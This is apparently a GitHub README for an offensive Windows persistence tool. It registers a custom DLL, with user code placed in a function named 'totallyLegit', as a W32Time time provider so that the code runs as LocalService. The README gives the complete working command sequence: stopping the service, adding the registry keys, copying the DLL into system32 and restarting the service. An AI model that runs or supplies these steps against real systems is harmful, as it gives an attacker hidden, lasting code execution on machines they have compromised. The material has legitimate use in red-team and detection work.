# w32TimePersistence

Windows high-privilege persistence technique that consists in adding a new Time Provider and writing a custom DLL based off of [this](https://learn.microsoft.com/en-us/windows/win32/sysinfo/sample-time-provider) Sample Time Provider DDL template from Microsoft to execute code as the `LocalService` user.

## Usage
To use this technique, put whatever code you want to execute inside the `totallyLegit` function in the [library.cpp](https://github.com/otterpwn/w32TimePersistence/blob/main/library.cpp) file, compile the DLL and perform the following steps

1. Stop the w32time service
2. Add a registry entry for a new Time Provider pointing the DllName key to our DLL
3. Enable the new Time Provider and set it as a input Time Provider
4. Copy our DLL into the desired location
5. Start the process up again

```
sc stop w32time

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\w32TimePersistence.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "Enabled" /d "1" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "InputProvider" /d "1" /f

copy w32TimePersistence.dll C:\windows\system32\

sc start w32time
```
